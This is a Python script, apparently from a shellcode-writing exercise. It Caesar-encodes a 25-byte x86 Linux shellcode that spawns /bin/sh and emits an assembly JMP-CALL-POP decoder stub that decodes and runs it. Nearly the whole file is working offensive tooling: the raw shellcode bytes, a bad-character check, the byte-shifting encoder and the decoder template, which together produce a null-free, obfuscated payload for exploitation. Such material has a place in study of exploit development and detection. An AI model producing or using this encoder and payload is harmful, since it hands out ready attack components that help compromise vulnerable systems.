#!/usr/bin/python3
#Python Cesar Encoder

import sys

shellcode_decoder = "global _start\n\
\n\
section .text\n\
_start:\n\
 jmp short call_decoder\n\
\n\
decoder:\n\
 pop esi\n\
 xor ecx, ecx\n\
 mov cl, %SIZE%\n\
\n\
decode:\n\
 add byte [esi], %CESAR%\n\
 inc esi\n\
 loop decode\n\
 jmp short Shellcode\n\
\n\
call_decoder:\n\
 call decoder\n\
 Shellcode: db %ENCODED%"

badchars = [0x00]
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

known_chars = [0xeb, 0x0d, 0x5e, 0x31, 0xc9, 0xb1, 0x19, 0x80, 0x06, 0x46, 0xe2, 0xfa, 0xeb, 0x05, 0xe8, 0xee, 0xff, 0xfe, 0x06, 0x0e]
for elmt in badchars:
   if elmt in known_chars:
      print("One or more badchars is present in the decoder stub")
      sys.exit(1)
"""
 8048080: eb 0d                 jmp    804808f <call_decoder>

08048082 <decoder>:
 8048082: 5e                    pop    esi
 8048083: 31 c9                 xor    ecx,ecx
 8048085: b1 19                 mov    cl,0x19

08048087 <decode>:
 8048087: 80 06 0d              add    BYTE PTR [esi],0xd
 804808a: 46                    inc    esi
 804808b: e2 fa                 loop   8048087 <decode>
 804808d: eb 05                 jmp    8048094 <Shellcode>

0804808f <call_decoder>:
 804808f: e8 ee ff ff ff 

   0: fe 06                 inc    BYTE PTR [esi]
   2: fe 0e                 dec    BYTE PTR [esi]
"""

for i in range(1, 0xFF):
   if i in badchars:
      break
   encoded = ""
   encoded2 = ""
   for x in shellcode :
      # Cesar Encoding  
      y = ord(x) - i
      if y in badchars:
         break

      encoded += '\\x'
      encoded += '%02x' % y

      encoded2 += '0x'
      encoded2 += '%02x,' %y

   if len(encoded) == len(shellcode) * 4:
      break

shellcode_decoder = shellcode_decoder.replace("%SIZE%",  str(len(shellcode)))
shellcode_decoder = shellcode_decoder.replace("%ENCODED%", encoded2[:-1])
if i == 1:
   shellcode_decoder = shellcode_decoder.replace("add byte [esi], %CESAR%", "INC byte [esi]")
elif i == 0xFE:
   shellcode_decoder = shellcode_decoder.replace("add byte [esi], %CESAR%", "DEC byte [esi]")
else:
   shellcode_decoder = shellcode_decoder.replace("%CESAR%", str(i))

print(shellcode_decoder)
